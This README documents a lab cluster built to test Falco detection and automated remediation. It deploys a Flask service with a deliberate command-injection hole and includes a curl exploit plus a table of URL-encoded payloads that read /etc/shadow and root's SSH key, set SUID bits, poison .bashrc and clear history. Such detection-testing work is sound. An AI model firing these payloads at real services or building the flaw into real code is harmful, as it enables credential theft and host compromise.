# Test Environment IaC Bundle

One-click deployment of the full test cluster: kind + Cilium + Falco +
a deliberately vulnerable application.

## Prerequisites
`kind`, `kubectl`, `helm`, `docker` on PATH.

## Deploy
```bash
bash setup.sh
```

Then start the remediation engine on the host (outside the cluster, since
Falcosidekick posts to `http://172.17.0.1:5001`):
```bash
cd ../remediation-engine
source venv/bin/activate
python3 remediation_engine.py
```

## The vulnerable app

`vulnerable-app/` is a small Flask service with a real, intentional
command-injection flaw in its `/search` endpoint (unsanitized input
reaches a shell command) -- the same bug class as real CVEs in
self-hosted admin/log tools.

This replaces manual `kubectl exec` as the attack delivery method: instead
of simulating "the attacker already has a shell," an attacker exploits the
injection over HTTP first, demonstrating the full kill chain from external
exploitation to Falco detection to automated remediation.

Port-forward and exploit it:
```bash
kubectl port-forward svc/vulnerable-log-viewer 8080:8080
curl "http://localhost:8080/search?q=x;%20cat%20/etc/shadow"
```

### Attack mapping

Every technique in the project's attack pool is reachable through the
same injection point, by URL-encoding the payload after `q=x;%20`:

| Attack           | Payload (after `q=x;%20`)                                  |
|------------------|--------------------------------------------------------------|
| shell            | `echo%20test`                                                 |
| sensitive_file   | `cat%20/etc/shadow`                                            |
| suid             | `chmod%20u%2Bs%20/bin/busybox`                                 |
| k8s_api          | `curl%20-k%20-s%20https://kubernetes.default.svc`               |
| binary_drop      | `cp%20/bin/busybox%20/tmp/t%20%26%26%20/tmp/t%20ls`             |
| write_root       | `echo%20y%20%3E%20/malicious_1`                                |
| shell_config     | `echo%20alias%20ls%3Drm%20%3E%3E%20/root/.bashrc`               |
| clear_history    | `rm%20-f%20/root/.bash_history`                                 |
| ssh_info         | `cat%20/root/.ssh/id_rsa`                                       |
| rsync            | `rsync%20--version`                                             |
| env_privesc      | `GLIBC_TUNABLES%3Dglibc.cpu.hwcaps%3DSHSTK%20ls`                 |
| pkg_mgmt         | `apt-get%20update%20-qq`                                        |

For a scripted demo session using this entry point instead of `kubectl exec`,
point `generate_dataset_v6.sh`'s attack functions at `curl` calls to this
endpoint instead -- the ground-truth logging, pod respawn, and Falco
detection all work identically, since Falco observes the resulting syscalls
regardless of how the process was spawned.

## Files
- `kind-config.yaml` -- 2-node cluster topology (control-plane + worker)
- `setup.sh` -- orchestrates cluster, Cilium, Falco, vulnerable app, RBAC
- `vulnerable-app/` -- the injectable Flask service + Dockerfile
- `k8s/vulnerable-app.yaml` -- Deployment + Service for the vulnerable app
- `k8s/rbac.yaml` -- (add your existing `rbac.yaml` here) least-privilege
  ServiceAccount/ClusterRole for the remediation engine
- `falco-rules/custom-rules.yaml` -- (add your existing custom rules here)
